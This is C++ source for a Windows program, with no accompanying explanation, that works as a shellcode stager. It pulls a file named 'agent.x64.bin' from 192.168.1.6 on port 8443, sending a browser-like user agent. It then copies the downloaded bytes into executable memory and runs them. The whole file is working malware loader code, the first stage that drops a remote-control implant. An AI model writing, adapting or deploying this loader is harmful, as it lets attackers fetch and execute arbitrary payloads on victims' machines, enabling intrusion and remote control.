#include <windows.h>
#include <wininet.h>
#include <cstdio>
#pragma comment(lib, "wininet.lib")

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmd, int nShow) {
    
    const char* ip = "192.168.1.6";
    const char* port = "8443";
    const char* file = "agent.x64.bin";
    
    char url[512];
    snprintf(url, sizeof(url), "http://%s:%s/%s", ip, port, file);
    
    // Download
    HINTERNET hNet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if(!hNet) {
        return 0;
    }
    
    HINTERNET hUrl = InternetOpenUrlA(hNet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if(!hUrl) {
        InternetCloseHandle(hNet);
        return 0;
    }
    
    unsigned char* buffer = (unsigned char*)VirtualAlloc(NULL, 1024*1024*5, MEM_COMMIT, PAGE_READWRITE);
    DWORD bytesRead = 0, totalRead = 0;
    
    while(InternetReadFile(hUrl, buffer + totalRead, 4096, &bytesRead) && bytesRead > 0) {
        totalRead += bytesRead;
    }
    
    InternetCloseHandle(hUrl);
    InternetCloseHandle(hNet);
    
    if(totalRead > 0) {
        // Execute shellcode
        LPVOID execMem = VirtualAlloc(NULL, totalRead, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if(execMem) {
            memcpy(execMem, buffer, totalRead);
            ((void(*)())execMem)();
        }
    }
    
    VirtualFree(buffer, 0, MEM_RELEASE);
    return 0;
}
